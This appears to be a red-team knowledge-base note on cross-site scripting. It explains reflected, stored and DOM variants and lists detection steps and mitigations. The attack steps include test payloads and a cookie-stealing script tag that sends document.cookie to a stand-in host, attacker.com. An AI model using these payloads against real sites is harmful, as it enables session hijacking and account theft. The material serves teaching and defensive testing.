Tags: #Status/In-Progress #Type/Technique #Context/Web #Context/Redteam

---
## Overview
Cross-Site Scripting (XSS) is a client-side code injection attack where malicious JavaScript is injected into a trusted web application and executed in the victim's browser. XSS targets other users of the application rather than the server itself. It can be used to steal session cookies, hijack accounts, redirect users to malicious pages, perform actions on behalf of the victim, or deliver malware. XSS is one of the most prevalent web vulnerabilities and falls under the Injection category of the [[OWASP Top 10 - 2021]].

---
## When To Use
- A web application reflects user input in page output without sanitization
- User-generated content (comments, posts, usernames, profiles) is stored and rendered to other users
- JavaScript dynamically writes unvalidated input to the DOM

## Requirements
- A web application that renders user-controlled input in an HTML context
- Output that is not HTML-encoded before being written to the page
- No effective Content Security Policy (CSP) blocking inline script execution

---
## Attack Steps

### Reflected XSS
Input is sent to the server, processed, and immediately reflected in the response — typically in error messages, search results, or URL parameters. The attack is not persistent; the victim must be sent a crafted URL.

1. Identify a parameter whose value appears in the page response (search fields, error messages, URL path segments)
2. Inject a basic test payload: `<script>alert(1)</script>`
3. Confirm execution — if the browser fires the alert, the field is vulnerable
4. Escalate to cookie theft: `<script>document.location='http://attacker.com/steal?c='+document.cookie</script>`
5. Deliver the exploit as a crafted URL to the victim

### Stored XSS
Malicious input is saved to the back-end database and executed every time the stored content is rendered — affecting every user who views the page. No crafted URL required after injection.

1. Identify an input field whose output is stored and later displayed to others (comment boxes, profile fields, post bodies)
2. Inject the payload: `<script>document.location='http://attacker.com/steal?c='+document.cookie</script>`
3. Confirm the payload is stored and executes on page load for any viewer
4. Wait for victims — any user loading the affected page triggers the payload

### DOM XSS
JavaScript in the page reads unvalidated input (URL hash, query string, `localStorage`) and writes it directly to the DOM without the value passing through the server. Standard server-side output encoding does not prevent this.

1. Identify JavaScript sources: `location.hash`, `location.search`, `document.referrer`, `localStorage`, `window.name`
2. Trace where the value flows into dangerous sinks: `document.write()`, `innerHTML`, `outerHTML`, `eval()`, `setTimeout()`
3. Inject payload via the identified source:
   `http://target.com/page#"><img src=/ onerror=alert(document.cookie)>`
4. Confirm execution — payload fires entirely in the browser without a server round-trip

---
## Detection
- Test input fields with `<script>alert(1)</script>` and event-handler payloads: `"><img src=x onerror=alert(1)>`
- Review page source for user input appearing unencoded in the HTML
- For DOM XSS: audit JavaScript for dangerous sinks (`innerHTML`, `document.write()`, `eval()`, `setTimeout()`) and trace back to unvalidated sources
- Browser DevTools → Sources → search for `location.hash` or `location.search` usage to identify DOM sinks
- Burp Suite active scanner flags XSS candidates automatically

## Mitigation
| Method | Description |
|--------|-------------|
| Output Encoding | Encode `<`, `>`, `"`, `'`, `&` before inserting user data into HTML context |
| Input Validation | Reject input that doesn't conform to expected format and length |
| Content Security Policy (CSP) | HTTP response header restricting which script sources the browser may execute |
| `HTTPOnly` Cookie Flag | Prevents JavaScript from reading session cookies, limiting cookie theft impact |
| Safe DOM APIs | Use `textContent` instead of `innerHTML`; sanitize via trusted library (DOMPurify) |
| `X-XSS-Protection` Header | Legacy browser-side filter — deprecated in modern browsers; not a primary control |

---
## Related Knowledge
- [[Website Innerworkings]]
- [[JavaScript Essentials]]
- [[OWASP Top 10 - 2021]]

## Related Playbook
- [[Red Team]]

## Related Tools
- [[Burp Suite]]
- [[Burp Scanner]]

---
## References / Images
- OWASP XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- OWASP DOM XSS Prevention: https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
